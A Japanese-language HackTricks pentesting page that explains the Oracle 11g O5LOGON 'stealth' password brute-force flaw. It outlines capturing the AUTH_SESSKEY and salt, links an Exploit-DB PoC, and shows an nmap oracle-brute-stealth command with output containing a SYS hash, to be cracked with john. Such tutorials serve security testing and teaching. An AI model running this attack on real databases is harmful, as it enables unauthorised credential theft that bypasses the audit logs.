```markdown
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で<strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksに広告を掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを共有する。

</details>


# 外周: リモートステルスパスワードブルートフォース

**バージョン11.1.0.6、11.1.0.7、11.2.0.1、11.2.0.2、および11.2.0.3は**このテクニックに対して脆弱です。この脆弱性の背後にある考え方を理解するためには、認証プロトコルがデータベースとどのように動作するかを考慮する必要があります。バージョン11について説明します。サーバーとのやり取りは以下の通りです:

1. クライアントがサーバーに接続し、ユーザー名を送信します。
2. サーバーはセッション識別子（'AUTH\_SESSKEY'）を生成し、AES-192を使用して暗号化します。キーとして、システムはユーザーパスワードとソルト（'AUTH\_VFR\_DATA'）から生成されたSHA-1ハッシュを使用します。
3. サーバーは暗号化されたセッションIDとソルトをクライアントに送信します。
4. クライアントは、受け取ったパスワードとソルトをハッシュ化してキーを生成します。このキーを使用して、サーバーから受け取ったセッションデータを復号化します。
5. サーバーのセッションIDを復号化した基に、クライアントは将来使用するための新しい公開キーを生成します。

ここで最も興味深い部分です: サーバーがクライアントに送信するセッションID 'AUTH\_SESSKEY'は48バイトの長さがあります。このうち40バイトはランダムで、最後の8バイトは'0x08'の複製です。初期化ベクトルは0x00（Null）です。
公開識別子の最後の8バイトが常に'0x08'で構成されていることを知っていれば、このパスワードをブルートフォースでき、さらにオフラインモードで行うことができます。これは、特にGPUを使用する場合、非常に高速です。攻撃を行うには、SID、有効なログイン（例えば、「SYS」アカウントは非常に興味深い）を知り、もちろんデータベースに接続する能力が必要です。この場合、Oracle監査ログに「無効なログイン試行」といった記録は作成されません！

すべてをまとめると:

1. Wiresharkを使用して、**認証中の** **初期トラフィックを** **傍受**します。これは「tns」フィルターによって助けられます。
2. **AUTH\_SESSKEY、AUTH\_VFR\_DATA**の**HEX値を抽出**します。
3. それらを[**PoCスクリプト**](https://www.exploit-db.com/exploits/22069)に挿入し、辞書（ブルートフォース）攻撃を実行します。

## nmapとjohnを使用する
```
```
root@kali:~# nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30

Starting Nmap 6.49BETA4 (https://nmap.org) at 2016-03-02 14:58 EST
Nmap scan report for 10.11.21.30
PORT     STATE SERVICE
1521/tcp open  oracle
| oracle-brute-stealth:
|   Accounts
|     SYS:$o5logon$1245C95384E15E7F0C893FCD1893D8E19078170867E892CE86DF90880E09FAD3B4832CBCFDAC1
|     A821D2EA8E3D2209DB6*4202433F49DE9AE72AE2 -
|     Hashed valid or invalid credentials
|   Statistics
|_    Performed 241 guesses in 12 seconds, average tps: 20

john hashes.txt
```
<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを共有する。

</details>
